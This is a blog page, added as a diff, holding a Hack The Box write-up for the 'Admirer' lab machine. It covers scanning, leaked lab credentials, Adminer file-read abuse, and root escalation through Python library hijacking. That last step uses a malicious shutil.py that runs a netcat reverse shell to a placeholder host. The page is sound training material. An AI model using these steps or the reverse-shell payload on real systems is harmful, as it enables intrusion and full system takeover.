@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title> Admirer </title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Admirer</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Hackthebox/">Hackthebox</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="Admirer-K3nX"><a href="#Admirer-TyPx0oN" class="headerlink" title="Admirer - TyPx0oN">
+		    </a>Admirer - K3nX</h3><p><img src="admirer.png" alt="Sample Image"></p>
+<ul>
+<li>Machine Name is Admirer</li>
+<li>This is Easy Box and IP address is 10.10.10.187</li>
+</ul>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre><code class="bash"># nmap -sSV -O -A -T4 10.10.10.187
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 22:34 +0630
+Nmap scan report for 10.10.10.187
+Host is up (0.97s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=5/4%OT=21%CT=1%CU=34680%PV=Y%DS=2%DC=T%G=Y%TM=5EB03D5F
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=8)OPS(
+OS:O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11
+OS:NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT       ADDRESS
+1   776.78 ms 10.10.16.1
+2   371.61 ms 10.10.10.187
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.23 seconds
+</code></pre>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul>
+<li><p>As Nmap Result Show port 21(FTP), port 22 (ssh) and port 80(apache httpd) are open</p>
+</li>
+<li><p>I type this ip address in browser , I saw this webpage<br><img src="web.png" alt="Sample Image"></p>
+</li>
+<li><p>I found nothing in this webpage,So I try with dirbuster<br>I found robots.txt file with Status Code 200<br><img src="dirbuster.png" alt="Sample Image"></p>
+</li>
+<li>
+	<p>In this robots.txt file</p>
+</li>
+<pre><code class="bash"># cat robots.txt
+User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+</code></pre>
+</ul>
+<ul>
+<li><p>This dir show 403 Forbidden Error</p>
+</li>
+<br><img src="admindir.png" alt="Sample Image">
+<li><p>In this time , I use gobuster to bruteforce directory content. </p>
+<pre><code class="bash"># gobuster -u http://10.10.10.187/admin-dir -w /root/htb/admirer/common.txt
+
+=====================================================
+Gobuster v3.0.1             
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.187/admin-dir/
+[+] Threads      : 10
+[+] Wordlist     : /root/htb/admirer/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2020/05/06 20:02:13 Starting gobuster
+=====================================================
+/contact.txt (Status: 200)
+/credentials.txt (Status: 200)
+=====================================================
+2020/05/06 20:10:25 Finished
+=====================================================
+</code></pre>
+</li>
+</ul>
+<pre><code class="bash"># cat contact.txt
+##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre>
+<pre><code class="bash"># cat credentials.txt
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre>
+<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>FTP</h3><ul>
+<li>In this credentials.txt file , I found ftpusername and password</li>
+<li>I try to login with this username and password , It's work</li>
+<li>I found 2 files in this ftp , I download this files into my machines<br><img src="ftp.png" alt="Sample Image"></li>
+<li>I analyze this dump.sql file. The dump was really interesting. I only got the MariaDB version and information about pictures on thehome page</li>
+<li>I got one tar.gz file , I extract this file and I got some files including index.php, utility-scripts , w4ld0s_s3cr3t_d1r<pre><code class="bash"># tar -xzvf html.tar.gz && ls
+assets       images     robots.txt       w4ld0s_s3cr3t_d1r
+index.php    utility-scripts
+</code></pre>
+</li>
+<li>I found database credentials in index.php but but nmap scan didn't reveal any databse port (like 3306 for example) It is bad
+I found few more php files in the utility-scripts. admin-task.php seemed to be the way to gain access to the server. <br></li>
+<li>In This files , I found database username and password , But I dont'know what should i do</li>
+</ul>
+<h3 id="exploitation"><a href="#exploitation" class="headerlink" title="exploitation"></a>Exploitaton</h3><ul>
+<li><p>In this time , My Friend told me adminer.php file is locate in this server find this</p></li>
+<li><p>After 5mins finding, I found this adminer.php file</p></li>
+<li><p><a href="http://10.10.10.187/utility-scripts/adminer.php">http://10.10.10.187/utility-scripts/adminer.php</a><br><img src="adminer.png" alt="Sample Image"></p>
+<li><p>In This Time I found one vulnerabality in adminer</p>
+</li>
+<a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">Vulnerability in Adminer</a>
+<li><p>Basically all I had to do was to set a mysql-server on my machine, create a database, create a table with a single column, login to my database on the victim’s Adminer and from there I could dump any local file.</p></li>
+<pre><code class="bash">MariaDB [(non)]> create database exploit;
+MariaDB [(none)]> CREATE USER 'demo'@'%' IDENTIFIED BY 'password';
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [(none)]> GRANT ALL PRIVILEGES ON * . * TO 'demo'@'%';
+Query OK, 0 rows affected (0.002 sec)
+
+MariaDB [(none)]> FLUSH PRIVILEGES;
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [(none)]> use exploit;
+Database changed
+
+MariaDB [exploit]> create table test(data VARCHAR(500));
+Query OK, 0 rows affected (0.007 sec)
+
+MariaDB [exploit]> 
+
+</code></pre>
+<li>Connect from adminer.php and  try to exploit this </li>
+<img src="dbcommand.png" alt="Sample Image">
+<li>In this time , I cound dump any local file </li>
+<img src="dump.png" alt="Sample Image">
+<li>Now I got username and password </li>
+<li><p>After Dumping I got some credentials waldo was one of them. I tried to connect with ssh with this username and password <br><img src="ssh.png" alt="Sample Image"></p>
+</li>
+<li><p>I use this username waldo and password to login with ssh</p>
+</li>
+<li><p>It is work<br><img src="user.png" alt="Sample Image"></p>
+</li>
+<li><p>Finally I got User<br></p>
+
+</li>
+</ul>
+<h3 id="Privileges-Escalation"><a href="#Priveleges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h3><ul>
+<li><p>I'm now logged as waldo and next step is to get root, First I look with sudo -l command<br>
+that user waldo can excute as root /opt/scripts/admin_tasks.sh script  </p>
+<pre><code class="bash">
+backup_web()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running backup script in the background, it might take a while..."
+        /opt/scripts/backup.py &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+</code></pre>
+<li>This Part of these script is calling python script in the same directory</li>
+</li>
+<li>Analyze this python script</li>
+<pre><code class="bash">cat /opt/scripts/backup.py
+#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+</code></pre>
+<li><p>In this time my friend give me one link and he told after read this article you will know what should you do</p>
+<a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">Privileges Escalation with Python Library Hijacking</a>
+</li>
+<li><p>I need to create my own shutil.py <br></p>
+</li>
+<pre>In Victim Machine<code class="bash">
+# cat shutil.py
+import os
+def make_archive(a, b, c):
+	os.system('nc yourip port -e "/bin/sh"')
+
+</code></pre>
+<pre>In My Machine <code class="bash">
+$ nc -lvnp 7777</code></pre>
+</li>
+<li><p>Victim Machine</p>
+<pre><code class="bash">
+$ sudo PYTHONPATH=/tmp/test /opt/scripts/admin_tasks.sh
+Choose no.6 option </code></pre>
+</li>
+<li><p>In your nc opening tab got connection as root from victim machine</p>
+</li>
+</ul>
+<p><b>Finally Owned This Machine</b></p>
+        </div>
+<img src="user.gif"  width="350" height="250">	
+<img src="root.gif"  width="350" height="250">	
+	<section class="post-copyright">
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright K3nX (c) 2019</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Hackthebox/"># Hackthebox</a>
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/27/old/">Old is Gold</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/24/meandmygf/">meandmygf</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© K3nX </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
